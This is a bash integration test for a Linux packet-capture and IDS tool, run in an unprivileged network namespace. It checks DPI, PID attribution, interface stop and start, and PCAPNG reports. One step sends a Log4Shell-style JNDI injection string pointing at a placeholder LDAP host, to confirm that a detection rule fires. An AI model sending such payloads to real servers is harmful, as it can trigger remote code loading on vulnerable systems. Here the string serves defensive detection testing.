#!/usr/bin/env bash
# Real Linux integration: TPACKET_V3/AF_PACKET -> HTTP DPI -> /proc PID attribution,
# bounded packet history, per-interface control, native IDS/Hunt, global
# pause/resume, PCAPNG recorder and graceful reports.
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BIN="${BIN:-$ROOT/dist/netprobe-linux-amd64}"
[[ -x "$BIN" ]] || { echo "Missing $BIN; run scripts/build-static.sh first"; exit 1; }
for c in unshare ip curl python3; do command -v "$c" >/dev/null || { echo "SKIP: missing $c"; exit 77; }; done
if ! unshare -Urn true 2>/dev/null; then echo 'SKIP: unprivileged user/network namespaces unavailable'; exit 77; fi
unshare -Urn env NETPROBE_BIN="$BIN" bash <<'NETPROBE_NS'
set -euo pipefail
ip link set lo up
ip link add veth0 type veth peer name veth1
ip link set veth0 up
ip link set veth1 up
TMP=$(mktemp -d)
cat >"$TMP/config.json" <<'JSON'
{"auth":{"enabled":false},"security":{"console_allowed_cidrs":["127.0.0.0/8","::1/128"]}}
JSON
HPID=''; NPID=''
cleanup(){ if [[ -n "$NPID" ]]; then kill "$NPID" 2>/dev/null || true; wait "$NPID" 2>/dev/null || true; fi; if [[ -n "$HPID" ]]; then kill "$HPID" 2>/dev/null || true; wait "$HPID" 2>/dev/null || true; fi; rm -rf "$TMP"; }
trap cleanup EXIT
python3 -m http.server 18081 --bind 127.0.0.1 >"$TMP/http.log" 2>&1 & HPID=$!
"$NETPROBE_BIN" --config "$TMP/config.json" --interface lo --interface veth0 --listen 127.0.0.1:19000 --data-dir "$TMP/data" >"$TMP/netprobe.log" 2>&1 & NPID=$!
sleep 2
curl -fsS http://127.0.0.1:18081/ >/dev/null
sleep 1
curl -fsS 'http://127.0.0.1:19000/api/v1/flows?limit=500' > "$TMP/flows.json"
curl -fsS 'http://127.0.0.1:19000/api/v1/packets?limit=50' > "$TMP/packets.json"
python3 - "$TMP/flows.json" "$TMP/packets.json" "$HPID" <<'PY'
import json,sys
flows=json.load(open(sys.argv[1])); packets=json.load(open(sys.argv[2])); pid=int(sys.argv[3])
target=[f for f in flows if f['local']['port']==18081 or f['remote']['port']==18081]
assert target, 'no port 18081 flow captured'
assert any((f.get('dpi') or {}).get('protocol')=='HTTP' for f in target), 'HTTP DPI failed'
assert any((f.get('process') or {}).get('pid')==pid for f in target), 'PID attribution failed'
assert packets and any(p.get('flow_id') for p in packets), 'recent packet metadata/history failed'
print('PASS: real AF_PACKET capture, HTTP DPI, process attribution, packet history')
PY

# Stop only veth0. Loopback must remain live and continue increasing counters.
curl -fsS -X POST http://127.0.0.1:19000/api/v1/control/interface/veth0/stop -d '{}' > "$TMP/stop-veth0.json"
sleep 1
curl -fsS http://127.0.0.1:19000/api/v1/status > "$TMP/status-veth0-stop.json"
BEFORE_IFACE=$(python3 - "$TMP/status-veth0-stop.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))['status']; m={x['name']:x for x in d['interfaces']}
assert m['veth0']['running'] is False,m
assert m['lo']['running'] is True,m
assert d['capture_running'] is True,d
assert m['lo'].get('backend','').startswith('tpacket_v3'),m
print(d['packets'])
PY
)
curl -fsS http://127.0.0.1:18081/ >/dev/null
sleep 1
curl -fsS http://127.0.0.1:19000/api/v1/status > "$TMP/status-lo-still-live.json"
python3 - "$TMP/status-lo-still-live.json" "$BEFORE_IFACE" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))['status']; m={x['name']:x for x in d['interfaces']}; before=int(sys.argv[2])
assert m['veth0']['running'] is False,m
assert m['lo']['running'] is True,m
assert d['packets']>before,(d['packets'],before)
print('PASS: per-interface stop leaves another interface actively capturing via TPACKET_V3')
PY
curl -fsS -X POST http://127.0.0.1:19000/api/v1/control/interface/veth0/start -d '{}' > "$TMP/start-veth0.json"
sleep 1
curl -fsS http://127.0.0.1:19000/api/v1/status > "$TMP/status-veth0-start.json"
python3 - "$TMP/status-veth0-start.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))['status']; m={x['name']:x for x in d['interfaces']}
assert m['veth0']['running'] is True,m
assert m['lo']['running'] is True,m
print('PASS: per-interface start recreates the paused capture session')
PY

# Deterministic plaintext exploit signature -> Security Finding -> server-side Hunt.
python3 - <<'PY'
import socket
s=socket.create_connection(('127.0.0.1',18081))
s.sendall(b'GET /?x=${jndi:ldap://lab.example/a} HTTP/1.1\r\nHost: local\r\nConnection: close\r\n\r\n')
try: s.recv(4096)
except Exception: pass
s.close()
PY
sleep 1
curl -fsS 'http://127.0.0.1:19000/api/v1/findings?limit=100' > "$TMP/findings.json"
curl -fsS -G 'http://127.0.0.1:19000/api/v1/hunt' --data-urlencode 'q=rule:NP-IDS-1201 severity:critical' > "$TMP/hunt.json"
python3 - "$TMP/findings.json" "$TMP/hunt.json" <<'PY'
import json,sys
findings=json.load(open(sys.argv[1])); hunt=json.load(open(sys.argv[2]))
match=[x for x in findings if x.get('rule_id')=='NP-IDS-1201']
assert match,'live JNDI signature finding missing'
assert match[0].get('verdict')=='signature_match',match[0]
assert hunt.get('counts',{}).get('findings',0)>=1,hunt
print('PASS: live native IDS finding + server-side Hunt API')
PY

# Global stop freezes all counters while console remains online.
curl -fsS -X POST http://127.0.0.1:19000/api/v1/control/stop -d '{}' > "$TMP/stop.json"
sleep 2
curl -fsS http://127.0.0.1:19000/api/v1/status > "$TMP/status-stop.json"
STOP_COUNT=$(python3 - "$TMP/status-stop.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1])); s=d['status']; assert s['capture_running'] is False, s; print(s['packets'])
PY
)
curl -fsS http://127.0.0.1:18081/ >/dev/null
sleep 1
curl -fsS http://127.0.0.1:19000/api/v1/status > "$TMP/status-still-stop.json"
python3 - "$TMP/status-still-stop.json" "$STOP_COUNT" <<'PY'
import json,sys
s=json.load(open(sys.argv[1]))['status']; before=int(sys.argv[2]); assert s['capture_running'] is False; assert s['packets']==before,(s['packets'],before)
print('PASS: global capture stop freezes counters while the web console remains online')
PY
curl -fsS -X POST http://127.0.0.1:19000/api/v1/control/start -d '{}' > "$TMP/start.json"
sleep 2
curl -fsS http://127.0.0.1:19000/api/v1/status > "$TMP/status-start.json"
START_COUNT=$(python3 - "$TMP/status-start.json" <<'PY'
import json,sys
s=json.load(open(sys.argv[1]))['status']; assert s['capture_running'] is True,s; print(s['packets'])
PY
)
curl -fsS http://127.0.0.1:18081/ >/dev/null
sleep 1
curl -fsS http://127.0.0.1:19000/api/v1/status > "$TMP/status-after-resume.json"
python3 - "$TMP/status-after-resume.json" "$START_COUNT" <<'PY'
import json,sys
s=json.load(open(sys.argv[1]))['status']; before=int(sys.argv[2]); assert s['capture_running'] is True; assert s['packets']>before,(s['packets'],before)
print('PASS: global capture start resumes live acquisition')
PY

kill -TERM "$NPID"; wait "$NPID"; NPID=''
python3 - "$TMP/data" <<'PY'
import glob,os,sys,json
base=sys.argv[1]
pcaps=glob.glob(base+'/pcap/*.pcapng')
json_reports=glob.glob(base+'/reports/*.json')
html_reports=glob.glob(base+'/reports/*.html')
assert pcaps and any(os.path.getsize(x)>28 for x in pcaps), 'no non-empty PCAPNG'
assert json_reports, 'no final JSON report'
assert html_reports, 'no final HTML report'
report=json.load(open(json_reports[-1]))
assert 'security_findings' in report, 'final report missing security_findings'
print('PASS: recorder + graceful final reports include security findings')
PY
NETPROBE_NS
